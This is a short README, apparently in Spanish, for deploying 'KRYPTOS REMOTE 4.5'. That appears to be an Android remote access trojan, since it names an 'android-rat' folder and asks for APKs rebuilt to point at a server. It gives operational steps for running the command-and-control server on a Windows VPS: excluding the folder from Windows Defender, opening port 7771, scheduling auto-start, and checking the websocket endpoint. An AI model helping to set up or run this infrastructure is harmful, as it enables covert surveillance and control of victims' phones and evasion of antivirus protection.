# KRYPTOS REMOTE 4.5 - Deploy en VPS Windows

## SUBIR (todo el proyecto) a C:\kryptos\
- server\  (incluye main.py, requirements.txt, web-dist\, web-app\, android-rat\, gangstar_local.db + -wal + -shm)
- android-rat\
- INSTALAR_Y_ARRANCAR.bat
- atualizar_frontend.bat
- INICIAR_PROJETO.bat

## NO SUBIR
- venv\        (el .bat lo crea en el VPS)
- __pycache__\
- node_modules\
- _emu\ , uber-apk-signer-main\   (opcional, pesan mucho)

## EN EL VPS
1. Instalar Python 3.12 marcando "Add Python to PATH"
2. Excluir C:\kryptos\ del Windows Defender
3. Doble clic a INSTALAR_Y_ARRANCAR.bat (acepta UAC)
   -> instala deps, crea venv, abre firewall, detecta IP publica,
      escribe .env, crea BD + admin, arranca con auto-reinicio
4. Abrir puerto 7771 TCP EN EL PANEL DEL PROVEEDOR (critico)
5. Tarea programada al inicio para INSTALAR_Y_ARRANCAR.bat
6. Cambiar la password del admin (viene admin/admin)

## APK
- El manifest YA tiene usesCleartextTraffic="true"
- Regenerar TODOS los APKs despues de setear la IP del VPS
- Verificar en el log del server: [URL] ...ws://IP:7771/ws
